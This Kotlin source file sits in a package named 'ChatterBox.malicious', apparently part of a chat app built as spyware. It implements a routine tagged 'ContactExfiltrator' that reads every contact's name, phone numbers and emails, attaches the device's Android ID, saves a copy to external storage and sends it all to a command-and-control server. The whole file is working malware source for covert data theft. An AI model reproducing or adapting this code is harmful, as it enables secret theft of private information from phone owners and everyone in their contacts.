package com.example.ChatterBox.malicious

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.provider.ContactsContract
import android.provider.Settings
import android.util.Log
import androidx.core.app.ActivityCompat
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import org.json.JSONArray
import org.json.JSONObject

class Contacts {
    companion object {
        private const val TAG = "ContactExfiltrator"

        fun exfiltrateContacts(context: Context) {
            // Check for permission first
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED
            ) {
                Log.d(TAG, "Contact permission not granted")
                return
            }

            try {
                // Initialize C2Client here inside the method with the context
                val c2Client = C2Client(context)

                val contactsList = mutableListOf<JSONObject>()
                val contentResolver = context.contentResolver

                // Query all contacts
                val cursor = contentResolver.query(
                    ContactsContract.Contacts.CONTENT_URI,
                    null,
                    null,
                    null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                )

                cursor?.use { cursor ->
                    if (cursor.count > 0) {
                        while (cursor.moveToNext()) {
                            val contactJson = JSONObject()

                            val idIndex = cursor.getColumnIndex(ContactsContract.Contacts._ID)
                            val id = if (idIndex != -1) cursor.getString(idIndex) else ""
                            val nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
                            val name = if (nameIndex != -1) cursor.getString(nameIndex) else ""
                            val phoneIndex = cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)
                            val hasPhoneNumber =
                                if (phoneIndex != -1) cursor.getInt(phoneIndex) else 0

                            contactJson.put("contact_id", id)
                            contactJson.put("name", name)

                            // Get phone numbers if they exist
                            if (hasPhoneNumber > 0) {
                                val phoneArray = JSONArray()
                                val phoneCursor = contentResolver.query(
                                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                    null,
                                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                    arrayOf(id),
                                    null
                                )

                                phoneCursor?.use { pCursor ->
                                    while (pCursor.moveToNext()) {
                                        val phoneNumIndex = pCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                                        val phoneNo = if (phoneNumIndex != -1) pCursor.getString(phoneNumIndex) else ""

                                        val phoneTypeIndex = pCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)
                                        val phoneType = if (phoneTypeIndex != -1) pCursor.getInt(phoneTypeIndex) else 0

                                        val phoneJson = JSONObject()
                                        phoneJson.put("number", phoneNo)
                                        phoneJson.put("type", getPhoneTypeName(phoneType))

                                        phoneArray.put(phoneJson)
                                    }
                                }

                                contactJson.put("phones", phoneArray)
                            }

                            // Get emails
                            val emailArray = JSONArray()
                            val emailCursor = contentResolver.query(
                                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                                arrayOf(id),
                                null
                            )

                            emailCursor?.use { eCursor ->
                                while (eCursor.moveToNext()) {
                                    val emailIndex = eCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA)
                                    val email = if (emailIndex != -1) eCursor.getString(emailIndex) else ""

                                    val emailTypeIndex = eCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE)
                                    val emailType = if (emailTypeIndex != -1) eCursor.getInt(emailTypeIndex) else 0

                                    val emailJson = JSONObject()
                                    emailJson.put("email", email)
                                    emailJson.put("type", getEmailTypeName(emailType))

                                    emailArray.put(emailJson)
                                }
                            }

                            contactJson.put("emails", emailArray)
                            contactsList.add(contactJson)
                        }
                    }
                }

                // Create a JSON object with all contacts and metadata
                val contactsData = JSONObject()
                contactsData.put(
                    "device_id",
                    Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
                )
                contactsData.put("timestamp", System.currentTimeMillis())
                contactsData.put("contacts_count", contactsList.size)

                val contactsArray = JSONArray()
                for (contact in contactsList) {
                    contactsArray.put(contact)
                }
                contactsData.put("contacts", contactsArray)

                // Log for debugging
                Log.d(TAG, "Collected ${contactsList.size} contacts")

                // Save locally for verification
                val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                val contactsFile = File(getExternalFilesDir(context), "contacts_$timestamp.json")
                FileOutputStream(contactsFile).use { out ->
                    out.write(contactsData.toString(2).toByteArray())
                }

                // Send to C2 server
                c2Client.sendExfiltrationData("contacts", contactsData.toString())

                Log.d(TAG, "Contacts exfiltrated to C2 server")

            } catch (e: Exception) {
                Log.e(TAG, "Error exfiltrating contacts", e)
            }
        }

        private fun getExternalFilesDir(context: Context): File {
            val dir = File(context.getExternalFilesDir(null), "contacts")
            if (!dir.exists()) {
                dir.mkdirs()
            }
            return dir
        }

        /**
         * Get phone type name
         */
        private fun getPhoneTypeName(type: Int): String {
            return when (type) {
                ContactsContract.CommonDataKinds.Phone.TYPE_HOME -> "Home"
                ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "Mobile"
                ContactsContract.CommonDataKinds.Phone.TYPE_WORK -> "Work"
                else -> "Other"
            }
        }

        /**
         * Get email type name
         */
        private fun getEmailTypeName(type: Int): String {
            return when (type) {
                ContactsContract.CommonDataKinds.Email.TYPE_HOME -> "Home"
                ContactsContract.CommonDataKinds.Email.TYPE_WORK -> "Work"
                else -> "Other"
            }
        }
    }
}